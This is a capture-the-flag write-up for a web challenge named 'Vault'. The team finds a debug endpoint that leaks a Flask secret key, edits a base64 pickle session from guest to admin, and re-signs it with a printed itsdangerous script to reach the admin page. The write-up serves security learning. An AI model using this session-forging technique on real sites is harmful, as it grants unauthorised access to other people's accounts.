---
layout: page
title: Vault
category: Web
type: ctf_tcon82025
desc: Vault
img-link: /writeups/ctf/tcon82025/img/vault/1.png
---


# [Web] Vault - 300

We are given with the link to to https://vault.project-ag.org

![Vault Home Page](img/vault/1.png)

We're presented with "Access Vault" and "Documentation". Clicking the "Access Vault" leads us to the page below.

![Dashboard HTML](img/vault/2.png)

As can be seen also from the above screenshot, it also presents the current session we have as the user. Clicking on the "Admin Panel", gives us the Access Denied error message below.

![Dashboard flag](img/vault/3.png)

We tampered around the website and my teammate [ruur](https://ruur.gitbook.io/ctf-writeups) pointed out there was a `/debug` endpoint. Turns out, it has the key for signing keys within Flask.

![Dashboard flag](img/vault/4.png)

Now that we have a signing key, we just need to figure out what data we need to sign. Turns out that the data part of the session string is a Pickle encoded base64 string.

![Dashboard flag](img/vault/5.png)

![Dashboard flag](img/vault/6.png)

As can be seen above, we're only guest and have a guest@vault.com email. We can quickly change it to "admin"

![Dashboard flag](img/vault/7.png)

Turn it into base64 and sign it. However, if you're going to look at the session string, there's no timestamp. Below output from `flask-unsign` has a timestamp. 

![Dashboard flag](img/vault/7.5.png)

Compared to...

![Dashboard flag](img/vault/7.6.png)

You quickly count the "."s and you would see that there's 2 in the first one and only 1 in the website. This means there's a different signing method used for this.

Turns out, we can use the `URLSafeSerializer` from `itsdangerous`. The ones commonly used now are timed and thus timestamp is always included but the older function is doesn't have timestamp included when signing and printing sessions.

```python3
from itsdangerous import URLSafeSerializer

# Initialize the URL-safe serializer with a secret key
s = URLSafeSerializer('super_secret_key_for_vault_application_2024')
...
```

So we have the full signing code below:

```python
from itsdangerous import URLSafeSerializer

# Initialize the URL-safe serializer with a secret key
s = URLSafeSerializer('super_secret_key_for_vault_application_2024')

# Data to serialize
# This is admin session tampered from original
data = "gASVWAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH2UKIwIdXNlcm5hbWWUjAVhZG1pbpSMB2JhbGFuY2WUS2SMB2FjY291bnSUjA9hZG1pbkB2YXVsdC5jb22UdWIu"

# This is original guest session
#data = "gASVWAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH2UKIwIdXNlcm5hbWWUjAVndWVzdJSMB2JhbGFuY2WUS2SMB2FjY291bnSUjA9ndWVzdEB2YXVsdC5jb22UdWIu"

# Serialize and sign the data into a URL-safe string
token = s.dumps(data)
print(f"Generated URL-safe token: {token}")

# Load and verify the data (no time check)
try:
    loaded_data = s.loads(token)
    print(f"Loaded data: {loaded_data}")
except Exception as e:
    # Handles BadSignature, etc.
    print(f"Error loading token: {e}")

```

We generated our guest session and set to Cookie `vault_session` to confirm if we have the same session string from the web.

![Dashboard flag](img/vault/9.png)

And we did! So we tried to sign the tampered Pickle data with admin username and signed it

![Dashboard flag](img/vault/10.png)

We sent it to `/admin` endpoint through Cookie `vault_session` and we managed get access and got the flag.


